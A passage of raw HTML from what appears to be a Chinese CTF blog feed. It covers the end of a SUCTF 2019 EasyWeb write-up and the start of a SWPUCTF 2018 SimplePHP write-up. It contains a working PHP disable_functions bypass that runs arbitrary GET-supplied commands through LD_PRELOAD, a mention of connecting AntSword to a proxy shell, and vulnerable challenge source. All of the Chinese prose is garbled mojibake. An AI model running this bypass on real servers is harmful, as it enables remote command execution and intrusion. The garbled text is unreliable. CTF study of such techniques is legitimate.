src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717194223861.png"></p><p>ç”±äºç¦ç”¨äº†mailï¼Œæ‰€ä»¥å¾—è€ƒè™‘å…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚<code>error_log</code>ï¼Œ<code>mb_send_mail</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p> &lt;b>example&lt;/b>: bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so &lt;/p>"</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" > "</span> <span class="token operator">.</span> <span class="token variable">$out_path</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" 2>&amp;1"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token operator">.</span> <span class="token variable">$evil_cmdline</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"EVIL_CMDLINE="</span> <span class="token operator">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"LD_PRELOAD="</span> <span class="token operator">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä»¥ä¸‹ä¸‰ä¸ªå¯ä»¥ä¸€èµ·æ”¾ç€ï¼Œå‡½æ•°è¢«ç¦ç”¨ä¹Ÿä¸éœ€è¦æ³¨é‡Šï¼Œä¸å½±å“</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mb_send_mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ä»¥ä¸‹ä¸¤ä¸ªæ²¡æœ‰åˆ™éœ€è¦æ³¨é‡Šæ‰ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸æ‰§è¡Œ</span><span class="token comment">// $img = Imagick("1.mp4"); //å¦‚æœæœ‰ImageMagickè¿™ä¸ªæ‰©å±•(æ–‡ä»¶å¿…é¡»å­˜åœ¨)</span><span class="token comment">// imap_mail("", "", ""); //éœ€è¦å®‰è£…imapæ‹“å±•</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token operator">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717194518630.png"></p><p>æˆåŠŸã€‚å•å•è¿™ä¸ªPHPçš„è¯ï¼Œä¼¼ä¹ä¸èƒ½ç”¨èšå‰‘è¿æ¥ã€‚</p><h3 id="3-3-åˆ©ç”¨èšå‰‘ä¸€é”®bypassï¼"><a href="#3-3-åˆ©ç”¨èšå‰‘ä¸€é”®bypassï¼" class="headerlink" title="3-3.åˆ©ç”¨èšå‰‘ä¸€é”®bypassï¼"></a>3-3.åˆ©ç”¨èšå‰‘ä¸€é”®bypassï¼</h3><p>èšå‰‘nbï¼<del>ç ´éŸ³</del></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717195728573.png"></p><p>ç„¶åè¿æ¥<code>/.antproxy.php</code>ï¼Œè¿˜èƒ½å†ç”¨èšå‰‘è¿ï¼Œèšå‰‘nbï¼</p><p>ç»“æŸã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://my.oschina.net/u/4328601/blog/3401784">https://my.oschina.net/u/4328601/blog/3401784</a></p><p><a href="https://blog.csdn.net/qq_42967398/article/details/105615235">https://blog.csdn.net/qq_42967398/article/details/105615235</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> disable_functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[SWPUCTF 2018]SimplePHP</title>
      <link href="/p/1119933272.html"/>
      <url>/p/1119933272.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®è¯:[phar|pop|ä¸Šä¼ ]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163355954.png" alt="image-20210710163355954"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>F12æœ‰æƒŠå–œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163417170.png" alt="image-20210710163417170"></p><p><code>file.php?file=</code>å¯ä»¥çœ‹åˆ°å„ä¸ªphpç•Œé¢æºç </p><h3 id="æ–‡ä»¶æºç "><a href="#æ–‡ä»¶æºç " class="headerlink" title="æ–‡ä»¶æºç "></a>æ–‡ä»¶æºç </h3><ul><li><p>file.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>function.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">222.90.67.205<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//show_source(__FILE__);</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"base.php"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>    <span class="token comment">//mkdir("upload",0777);</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("ä¸Šä¼ æˆåŠŸ!");&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//echo "&lt;h4>è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:" . "&lt;h4/>";</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>base.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>web3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>é¦–é¡µ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbra-toggle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span 